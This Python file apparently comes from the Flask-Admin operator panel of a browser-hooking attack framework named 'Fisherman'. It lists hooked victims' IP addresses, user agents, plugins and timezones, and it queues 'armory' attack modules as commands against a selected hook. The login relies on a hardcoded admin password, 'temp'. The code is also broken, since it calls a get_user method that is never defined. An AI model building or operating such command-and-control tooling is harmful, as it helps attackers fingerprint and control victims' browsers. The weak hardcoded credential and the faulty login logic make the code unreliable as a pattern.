from flask_admin.contrib.sqla import ModelView
from flask import abort, json
from wtforms import SelectField
from wtforms.validators import InputRequired
from flask import request, redirect, url_for
from flask_admin import AdminIndexView, BaseView, helpers, expose
import flask_login as login
from wtforms import form, fields, validators
from werkzeug.security import generate_password_hash, check_password_hash
from flask_wtf import FlaskForm
from ..armory.parsers import Module
from ..command.models import Command
from ..hook.models import Hook

TEMP_ADMIN_PASSWORD = generate_password_hash("temp")

class LoginForm(form.Form):
    login = fields.StringField(validators=[validators.InputRequired()])
    password = fields.PasswordField(validators=[validators.InputRequired()])

    def validate_login(self):
        if not check_password_hash(TEMP_ADMIN_PASSWORD, self.password.data):
            raise validators.ValidationError('Invalid password')

class FishermanIndexView(AdminIndexView):
    @expose('/')
    def index(self):
        if not login.current_user.is_authenticated:
            return redirect(url_for('.login_view'))
        return super(FishermanIndexView, self).index()
    
    @expose('/login/', methods=('GET', 'POST'))
    def login_view(self):
        form = LoginForm(request.form)
        if helpers.validate_form_on_submit(form):
            user = form.get_user()
            login.login_user(user)

        if login.current_user.is_authenticated:
            self.admin_is_logged_in = True
            return redirect(url_for('.index'))
        
        self._template_args['form'] = form
        return super(FishermanIndexView, self).index()
    
    @expose('/logout/')
    def logout_view(self):
        login.logout_user()
        return redirect(url_for('.index'))

class CommandAdminView(ModelView):
    column_list = ('hook_id', 'command')
    form_columns = ('hook_id', 'command')
    column_labels = {'hook_id': 'Hook ID'}
    
class AttacksView(BaseView):
    @expose('/')
    def index(self):
        return self.render('admin/attacks_index.html') # /api/templates/admin/attacks_index.html (base admin folder)

    @expose('/command')
    def command_update(self):
        id = request.args.get('id')
        module = request.args.get('module')

        if not id or not module:
            return abort(400)

        if not Module.has_value(module) or id not in [str(id_[0]) for id_ in Hook.query.with_entities(Hook.id).all()]:
            return abort(400)
        
        new_command = Command(
            hook_id=id,
            command=module
        )

        from ..extensions import db
        db.session.add(new_command)
        db.session.commit()
        return json.dumps({'success':True}), 200, {'ContentType':'application/json'} 
        

class HookAdminView(ModelView):
    column_list = ('id', 'ip_address', 'user_agent', 'screen_resolution', 'browser_plugins', 'language', 'timezone', 'last_update')
    column_labels = {'id': 'Hook ID'}
    